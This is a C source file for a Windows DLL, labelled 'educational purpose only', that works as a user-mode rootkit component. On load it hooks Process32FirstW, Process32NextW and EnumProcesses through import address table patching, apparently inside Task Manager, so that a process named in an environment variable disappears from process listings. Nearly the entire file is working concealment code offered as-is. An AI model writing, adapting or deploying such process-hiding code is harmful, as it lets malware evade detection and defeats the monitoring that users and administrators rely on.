/**
 * Windows Process Hiding Library - Educational Purpose Only
 * 
 * This code demonstrates how process hiding works by hooking
 * Windows API functions related to process enumeration.
 * Improved version with IAT hooking for better effectiveness.
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <psapi.h>

// Target process name to hide
static WCHAR g_TargetProcess[MAX_PATH] = {0};
static DWORD g_TargetPID = 0;

// Function pointer types for the functions we'll hook
typedef BOOL (WINAPI *PROCESS32FIRSTW)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL (WINAPI *PROCESS32NEXTW)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL (WINAPI *ENUMPROCESSES)(DWORD*, DWORD, LPDWORD);

// Original function pointers
static PROCESS32FIRSTW OriginalProcess32FirstW = NULL;
static PROCESS32NEXTW OriginalProcess32NextW = NULL;
static ENUMPROCESSES OriginalEnumProcesses = NULL;

// Get PID from process name
DWORD GetPIDFromName(LPCWSTR processName) {
    HANDLE hSnapshot;
    PROCESSENTRY32W pe32;
    DWORD pid = 0;
    
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return pid;
}

// Hooked Process32FirstW
BOOL WINAPI HookedProcess32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe) {
    BOOL result = OriginalProcess32FirstW(hSnapshot, lppe);
    
    // Skip target process
    while (result && g_TargetProcess[0] != L'\0') {
        if (_wcsicmp(lppe->szExeFile, g_TargetProcess) == 0 || 
            lppe->th32ProcessID == g_TargetPID) {
            result = OriginalProcess32NextW(hSnapshot, lppe);
        } else {
            break;
        }
    }
    
    return result;
}

// Hooked Process32NextW
BOOL WINAPI HookedProcess32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe) {
    BOOL result;
    
    do {
        result = OriginalProcess32NextW(hSnapshot, lppe);
        if (!result) break;
        
        // Skip if this is our target process
        if (g_TargetProcess[0] != L'\0' && 
            (_wcsicmp(lppe->szExeFile, g_TargetProcess) == 0 || 
             lppe->th32ProcessID == g_TargetPID)) {
            continue;
        }
        
        break;
    } while (result);
    
    return result;
}

// Hooked EnumProcesses
BOOL WINAPI HookedEnumProcesses(DWORD* pProcessIds, DWORD cb, LPDWORD pBytesReturned) {
    BOOL result = OriginalEnumProcesses(pProcessIds, cb, pBytesReturned);
    
    if (result && g_TargetPID != 0 && pBytesReturned && pProcessIds) {
        DWORD count = *pBytesReturned / sizeof(DWORD);
        DWORD newCount = 0;
        
        // Filter out target process
        for (DWORD i = 0; i < count; i++) {
            if (pProcessIds[i] != g_TargetPID) {
                pProcessIds[newCount++] = pProcessIds[i];
            }
        }
        
        *pBytesReturned = newCount * sizeof(DWORD);
    }
    
    return result;
}

// Simple IAT hooking function
BOOL HookFunction(HMODULE hModule, LPCSTR szFunc, LPVOID pNewFunc, LPVOID* ppOldFunc) {
    if (!hModule || !szFunc || !pNewFunc || !ppOldFunc) return FALSE;
    
    LPVOID pOriginal = GetProcAddress(hModule, szFunc);
    if (!pOriginal) return FALSE;
    
    *ppOldFunc = pOriginal;
    
    // Get Import Address Table
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + 
        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    
    // Find kernel32.dll or psapi.dll imports
    while (pImportDesc->Name) {
        LPSTR pszModName = (LPSTR)((BYTE*)hModule + pImportDesc->Name);
        if (_stricmp(pszModName, "kernel32.dll") == 0 || _stricmp(pszModName, "psapi.dll") == 0) {
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc->FirstThunk);
            
            while (pThunk->u1.Function) {
                LPVOID* ppfn = (LPVOID*)&pThunk->u1.Function;
                if (*ppfn == pOriginal) {
                    DWORD dwOldProtect;
                    if (VirtualProtect(ppfn, sizeof(LPVOID), PAGE_READWRITE, &dwOldProtect)) {
                        *ppfn = pNewFunc;
                        VirtualProtect(ppfn, sizeof(LPVOID), dwOldProtect, &dwOldProtect);
                        return TRUE;
                    }
                }
                pThunk++;
            }
        }
        pImportDesc++;
    }
    
    return FALSE;
}

// Setup hooks with IAT hooking
void SetupProcessHooks() {
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    HMODULE hPsapi = GetModuleHandleW(L"psapi.dll");
    HMODULE hCurrentModule = GetModuleHandleW(NULL); // Current process (taskmgr.exe)
    
    if (hKernel32 && hCurrentModule) {
        // Try to hook Process32FirstW and Process32NextW
        if (!HookFunction(hCurrentModule, "Process32FirstW", HookedProcess32FirstW, (LPVOID*)&OriginalProcess32FirstW)) {
            // Fallback: get function addresses directly
            OriginalProcess32FirstW = (PROCESS32FIRSTW)GetProcAddress(hKernel32, "Process32FirstW");
        }
        
        if (!HookFunction(hCurrentModule, "Process32NextW", HookedProcess32NextW, (LPVOID*)&OriginalProcess32NextW)) {
            // Fallback: get function addresses directly
            OriginalProcess32NextW = (PROCESS32NEXTW)GetProcAddress(hKernel32, "Process32NextW");
        }
    }
    
    if (hPsapi && hCurrentModule) {
        // Try to hook EnumProcesses
        if (!HookFunction(hCurrentModule, "EnumProcesses", HookedEnumProcesses, (LPVOID*)&OriginalEnumProcesses)) {
            // Fallback: get function address directly
            OriginalEnumProcesses = (ENUMPROCESSES)GetProcAddress(hPsapi, "EnumProcesses");
        }
    }
}

// DLL entry point
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH: {
            CHAR envVar[MAX_PATH];
            if (GetEnvironmentVariableA("TARGET_PROCESS", envVar, MAX_PATH)) {
                // Convert to wide string
                MultiByteToWideChar(CP_ACP, 0, envVar, -1, g_TargetProcess, MAX_PATH);
                
                // Get the PID of the target process
                g_TargetPID = GetPIDFromName(g_TargetProcess);
                
                // Setup hooks
                SetupProcessHooks();
                
                // Create a log file for educational purposes
                FILE* logFile;
                if (fopen_s(&logFile, "C:\\process_hider_log.txt", "w") == 0 && logFile) {
                    fwprintf(logFile, L"Process hiding active for: %ls (PID: %lu)\n", 
                            g_TargetProcess, g_TargetPID);
                    fprintf(logFile, "Educational purposes only!\n");
                    fclose(logFile);
                }
            }
            break;
        }
        case DLL_PROCESS_DETACH:
            // Cleanup could be implemented here
            break;
    }
    
    return TRUE;
}
